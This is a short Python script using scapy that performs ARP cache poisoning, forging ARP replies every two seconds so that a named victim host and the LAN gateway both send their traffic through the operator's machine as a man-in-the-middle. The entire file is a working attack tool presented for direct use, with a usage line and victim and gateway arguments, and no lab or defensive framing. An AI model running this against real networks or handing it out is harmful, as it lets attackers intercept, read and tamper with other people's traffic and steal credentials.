#!/usr/bin/env python3
"""arp-poison — forge ARP replies to MITM two hosts on the same LAN.

Usage: arp-poison <iface> <victim_ip> <gateway_ip>

Sends, every 2 seconds:
  * to the victim : "the gateway is at MY mac"
  * to the gateway: "the victim  is at MY mac"

so both peers send their traffic to us. With net.ipv4.ip_forward=1 we relay it,
keeping the conversation alive while we sit in the middle. Ctrl-C to stop.
"""
import sys
import time
from scapy.all import ARP, Ether, srp, sendp, get_if_hwaddr, conf

conf.verb = 0


def resolve(ip, iface):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                 iface=iface, timeout=2, retry=3, verbose=0)
    for _, reply in ans:
        return reply.hwsrc
    sys.exit(f"[!] could not resolve {ip} on {iface}")


def spoof(iface, target_ip, target_mac, as_ip, my_mac):
    # Tell target_ip that as_ip lives at my_mac (ARP reply, op=2).
    pkt = Ether(dst=target_mac, src=my_mac) / ARP(
        op=2, psrc=as_ip, hwsrc=my_mac, pdst=target_ip, hwdst=target_mac)
    sendp(pkt, iface=iface, verbose=0)


def main():
    if len(sys.argv) != 4:
        sys.exit(__doc__)
    iface, victim_ip, gw_ip = sys.argv[1], sys.argv[2], sys.argv[3]
    my_mac = get_if_hwaddr(iface)
    victim_mac = resolve(victim_ip, iface)
    gw_mac = resolve(gw_ip, iface)
    print(f"[*] victim  {victim_ip} is at {victim_mac}")
    print(f"[*] gateway {gw_ip} is at {gw_mac}")
    print(f"[*] my mac is {my_mac} — poisoning both every 2s (Ctrl-C to stop)")
    try:
        while True:
            spoof(iface, victim_ip, victim_mac, gw_ip, my_mac)   # victim  -> I am the gateway
            spoof(iface, gw_ip, gw_mac, victim_ip, my_mac)       # gateway -> I am the victim
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[*] stopped (caches will re-learn the truth on their own)")


if __name__ == "__main__":
    main()
